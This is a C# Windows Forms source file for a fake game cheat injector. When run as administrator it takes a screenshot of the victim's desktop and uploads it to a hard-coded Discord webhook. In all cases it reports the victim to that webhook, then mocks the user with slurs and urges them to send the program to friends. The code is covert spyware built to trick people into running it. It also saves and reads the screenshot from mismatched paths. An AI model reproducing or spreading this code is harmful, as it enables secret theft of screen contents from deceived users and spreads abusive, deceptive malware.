using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace tool
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();

        }

        public Form2(Form parentForm)
        {
            InitializeComponent();
            Form opener;
            opener = parentForm;
        }

        private static void SendMs(string message)
        {
            string webhook = "https://discord.com/api/webhooks/1076036549931700266/I3NItV8zgdLkHenrAw5sm3Z25oAV8fUUzzLkkj4jBcBN-WHN4Ks7VBOxwNP1-CsuUyQb";
            WebClient webClient = new WebClient();
            webClient.Headers.Add("Content-Type", "application/json");
            string payload = "{\"content\": \"" + message + "\"}";
            webClient.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
        }

        public bool IsElevated
        {
            get
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public void cap()
        {
            MessageBox.Show("INJECTING");
            System.Threading.Thread.Sleep(5000);
            string title = "INJTECTED";
            string body = "PRESS OK THEN LAUNCH GAME";
            if (MessageBox.Show(body, title, MessageBoxButtons.OKCancel) == DialogResult.OK)
            {
                this.Hide();
                CaptureMyScreen();
                System.Threading.Thread.Sleep(5000);
                sendscreencap();
                SendMs("A retard tried injecting to his game :skull:");
                MessageBox.Show("bro ur so fucking stupid. u really thought this was a real cheat LMFAOOOO");
                MessageBox.Show("send this to ur retard friends to fool them xD");
                this.Close();
                Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
            }
            else
            {
                this.Close();
                Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
            }
        }

        public void nocap()
        {
            string title = "INJECTING";
            string body = "PRESS OK THEN LAUNCH GAME";
            if (MessageBox.Show(body, title, MessageBoxButtons.OKCancel) == DialogResult.OK)
            {
                this.Hide();
                System.Threading.Thread.Sleep(5000);
                SendMs("user did not run program as admin");
                MessageBox.Show("bro ur so fucking stupid. u really thought this was a real cheat LMFAOOOO");
                MessageBox.Show("send this to ur retard friends to fool them xD");
                MessageBox.Show("U might wanna see this :skull: :sob:");
                System.Diagnostics.Process.Start("https://discord.gg/se9UfGYEbf");
                this.Close();
                Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
            }
            else
            {
                this.Close();
                Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
            }
        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            if (IsElevated)
            {
                cap();
            }

            else
            {
                nocap();
            }
        }



        private void AIOBtn_Click(object sender, EventArgs e)
        {
            if (IsElevated)
            {
                cap();
            }
            else
            {
                nocap();
            }
        }



        private void Form2_Load(object sender, EventArgs e)
        {
        }

        private void exitButton_Click(object sender, EventArgs e)
        {
            this.Close();
            Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
        }


    

        private void iconPictureBox1_Click(object sender, EventArgs e)
        {
            this.Close();
            Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
        }


        public void CaptureMyScreen()
        {
            try
            {
                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(1366, 768, PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(@"C:\\Capture.jpg", ImageFormat.Jpeg);
                //Displaying the Successfull Result
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }

        public void sendscreencap()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string Webhook_link = "https://discord.com/api/webhooks/1076036549931700266/I3NItV8zgdLkHenrAw5sm3Z25oAV8fUUzzLkkj4jBcBN-WHN4Ks7VBOxwNP1-CsuUyQb";
            string FilePath = @"E:\Capture.jpg";
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "capture.jpg");
                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }
        }
    }
}
